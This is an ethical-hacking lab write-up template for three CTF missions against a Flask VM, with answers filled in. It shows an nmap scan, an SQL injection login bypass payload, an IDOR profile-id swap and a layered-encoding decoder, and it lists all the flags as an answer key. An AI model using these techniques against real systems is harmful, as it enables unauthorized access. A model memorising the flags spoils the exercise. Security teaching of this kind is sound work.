# Red Team Write-up — Operation Digital Turf War

**Team Name:** [Your Team Name]  
**Date:** [Date of Lab]  
**Instructor:** [Instructor Name]  
**Course:** Ethical Hacking / Information Security

---

## Mission 1 — Staff Portal Leak (Easy · 100 pts)

### Target Overview

| Field | Value |
|-------|-------|
| Target URL | `http://<target-ip>:5000/mission1` |
| Category | Web / Information Disclosure |
| Detected Services | HTTP (Flask), Port 5000 |

### Initial Analysis

> *Describe what you first saw when you opened the page. What did the visible login form tell you? What clue in the challenge description pointed you toward the source code?*

[Write your initial observations here]

### Tools Used

- Browser (Chrome / Firefox)
- View Page Source (Ctrl+U)
- Browser DevTools (F12)

### Exploitation Steps

1. Opened `/mission1` in a browser.
2. Right-clicked and selected **View Page Source**.
3. Searched the HTML for `picoCTF` using Ctrl+F.
4. Located the following HTML comment:

```html
<!-- picoCTF{html_comments_are_dangerous} -->
```

5. Extracted the flag.

### Screenshot

> *[Insert screenshot of the page source with the flag visible]*

### Flag Found

```
picoCTF{html_comments_are_dangerous}
```

### Mitigation Suggestion

> *Explain in your own words how this vulnerability could have been prevented.*

[Write 2–3 sentences here]

---

## Mission 2 — Layered Transmission (Medium · 200 pts)

### Target Overview

| Field | Value |
|-------|-------|
| Target URL | `http://<target-ip>:5000/mission2` |
| Category | Encoding / Cryptography |

### Initial Analysis

> *What did you notice about the encoded string? What did the case note hint suggest? How did you determine what the first layer of encoding was?*

[Write your initial observations here]

### Tools Used

- CyberChef / Python 3
- Browser

### Exploitation Steps

1. Copied the encoded payload from the page.
2. Identified the string as Base64 (alphanumeric characters, possibly padded with `=`).
3. Decoded Base64 → obtained reversed Caesar text.
4. Reversed the decoded string → obtained Caesar-shifted text.
5. Applied Caesar shift −3 to each letter → recovered the flag.

**Python decode:**

```python
import base64

payload = "<paste payload here>"
step1   = base64.b64decode(payload).decode()
step2   = step1[::-1]

def caesar(text, shift):
    result = []
    for ch in text:
        if ch.isalpha():
            base = ord('A') if ch.isupper() else ord('a')
            result.append(chr((ord(ch) - base + shift) % 26 + base))
        else:
            result.append(ch)
    return ''.join(result)

flag = caesar(step2, -3)
print(flag)
```

### Screenshot

> *[Insert screenshot of CyberChef or Python terminal showing the decoded flag]*

### Flag Found

```
picoCTF{layered_encoding_is_not_crypto}
```

### Mitigation Suggestion

> *Explain why encoding is not encryption, and what should be used instead.*

[Write 2–3 sentences here]

---

## Mission 3 — Digital Turf Breach (Hard · 300 pts)

### Target Overview

| Field | Value |
|-------|-------|
| Target IP | `<assigned VM IP>` |
| Target URL | `http://<target-ip>:5000` |
| Detected Services | Port 5000/tcp — HTTP (Flask/Werkzeug) |
| Tools Used | nmap, Browser, Burp Suite |

### Vulnerability Identification

| Vulnerability | Type | OWASP Reference |
|--------------|------|-----------------|
| SQL Injection | Injection | A03:2021 |
| IDOR | Broken Access Control | A01:2021 |

**Related CVE:** CWE-89 (SQL Injection), CWE-639 (Authorization Bypass Through User-Controlled Key)

### Phase 1 — Network Reconnaissance

```bash
nmap -sV <target-ip>
```

**Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug/3.0 Python/3.11
```

> *[Insert screenshot of nmap output]*

### Phase 2 — SQL Injection (Authentication Bypass)

**Step 1:** Opened `http://<target-ip>:5000/login`.

**Step 2:** Entered SQL injection payload:

| Field    | Value |
|----------|-------|
| Username | `' OR '1'='1' --` |
| Password | `anything` |

**Step 3:** Observed that login succeeded.

**Why it works:**

The vulnerable backend constructs the query as:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
```
The condition `'1'='1'` is always true. The `--` comments out the password check. The first database user (admin) is returned.

> *[Insert screenshot of successful login]*

### Phase 3 — IDOR (Broken Access Control)

**Step 1:** After login, observed URL: `/profile?id=1` (or `?id=102`).

**Step 2:** Changed URL to: `http://<target-ip>:5000/profile?id=1`

**Step 3:** Server returned the administrator profile.

**Step 4:** Notes field contained the flag.

> *[Insert screenshot of admin profile with flag visible]*

### Flag Found

```
picoCTF{digital_turf_war_compromised}
```

### Screenshot Evidence

> *[Insert all relevant screenshots: nmap scan, login payload, profile access, flag]*

### Mitigation Suggestion

> *Explain both the SQL injection fix and the IDOR fix in your own words.*

**SQL Injection:** [Write 2–3 sentences]

**IDOR / Broken Access Control:** [Write 2–3 sentences]

---

## Attack Flow Diagram

```
[Red Team Machine]
       |
       | Step 1: nmap -sV <target-ip>
       v
[Assigned Ethical VM — Port 5000]
       |
       | Step 2: Access /login
       v
[Vulnerable Login Form]
       |
       | Step 3: SQL Injection ' OR '1'='1' --
       v
[Authentication Bypassed — Session: admin]
       |
       | Step 4: Observe URL /profile?id=102
       | Step 5: Change to /profile?id=1
       v
[Admin Profile Returned]
       |
       | Step 6: Read flag from Notes field
       v
[FLAG CAPTURED: picoCTF{digital_turf_war_compromised}]
```

---

## Summary

| Mission | Points | Flag | Captured |
|---------|--------|------|----------|
| Staff Portal Leak | 100 | `picoCTF{html_comments_are_dangerous}` | ✅ |
| Layered Transmission | 200 | `picoCTF{layered_encoding_is_not_crypto}` | ✅ |
| Digital Turf Breach | 300 | `picoCTF{digital_turf_war_compromised}` | ✅ |
| **Total** | **600** | | |
